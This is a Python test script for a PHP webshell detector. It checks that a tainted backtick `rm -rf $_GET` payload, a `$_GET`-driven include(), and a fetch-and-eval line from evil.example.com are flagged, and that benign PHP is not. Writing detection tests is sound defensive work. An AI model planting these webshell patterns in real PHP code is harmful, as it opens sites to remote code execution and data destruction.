import os
import sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from core.php_analysis import analyze
from modules.webshell_detector import score_analysis


def main() -> None:
    backtick_payload = "<?php $out = `rm -rf $_GET['target']`; echo $out;"
    analysis = analyze("shell.php", backtick_payload)
    confidence, evidence, mitre = score_analysis(backtick_payload, analysis)
    assert "backtick_exec_tainted_input" in evidence, evidence
    assert confidence > 0
    print("Scenario 1 (backtick shell-exec operator fed with tainted superglobal input: detected) PASSED")

    normal_backtick = "<?php $version = `git rev-parse HEAD`;"
    analysis2 = analyze("build.php", normal_backtick)
    confidence2, evidence2, _ = score_analysis(normal_backtick, analysis2)
    assert "backtick_exec_tainted_input" not in evidence2, (
        f"a backtick with no tainted superglobal input must not trigger the tainted-input signature: {evidence2}"
    )
    print("Scenario 2 (backtick with a hardcoded command, no tainted input: signature does not fire) PASSED")

    include_payload = "<?php include($_GET['page'] . '.php');"
    analysis3 = analyze("router.php", include_payload)
    confidence3, evidence3, mitre3 = score_analysis(include_payload, analysis3)
    assert "dynamic_include_tainted_input" in evidence3, evidence3
    assert "T1105" in mitre3
    print("Scenario 3 (dynamic include() fed directly from $_GET: detected, classic LFI/RFI webshell pattern) PASSED")

    normal_include = "<?php include('config.php');"
    analysis4 = analyze("bootstrap.php", normal_include)
    confidence4, evidence4, _ = score_analysis(normal_include, analysis4)
    assert "dynamic_include_tainted_input" not in evidence4, (
        f"a literal include path must never trigger the tainted-include signature: {evidence4}"
    )
    print("Scenario 4 (normal include() with a literal path: signature does not fire) PASSED")

    remote_exec_payload = (
        "<?php $code = file_get_contents('http://evil.example.com/payload.txt'); eval($code);"
    )
    analysis5 = analyze("update.php", remote_exec_payload)
    confidence5, evidence5, mitre5 = score_analysis(remote_exec_payload, analysis5)
    assert "remote_fetch_exec_cooccurrence" in evidence5, evidence5
    assert "T1105" in mitre5
    print("Scenario 5 (remote fetch via file_get_contents(http://...) combined with eval(): detected) PASSED")

    local_fetch_payload = "<?php $data = file_get_contents('/var/local/cache.json'); echo $data;"
    analysis6 = analyze("cache_reader.php", local_fetch_payload)
    confidence6, evidence6, _ = score_analysis(local_fetch_payload, analysis6)
    assert "remote_fetch_exec_cooccurrence" not in evidence6, (
        f"a local file_get_contents() with no URL literal and no exec function must never trigger: {evidence6}"
    )
    print("Scenario 6 (local file_get_contents(), no URL literal, no exec function: signature does not fire) PASSED")

    single_weak_signal = "<?php $cmd = `whoami`; echo $cmd;"
    analysis7 = analyze("debug.php", single_weak_signal)
    confidence7, evidence7, _ = score_analysis(single_weak_signal, analysis7)
    assert confidence7 < 100, "a single weak signal must never alone reach maximum confidence"
    print("Scenario 7 (a single non-tainted backtick alone never escalates to maximum confidence) PASSED")

    print("\nALL WEBSHELL SIGNATURE COVERAGE TESTS PASSED")


main()
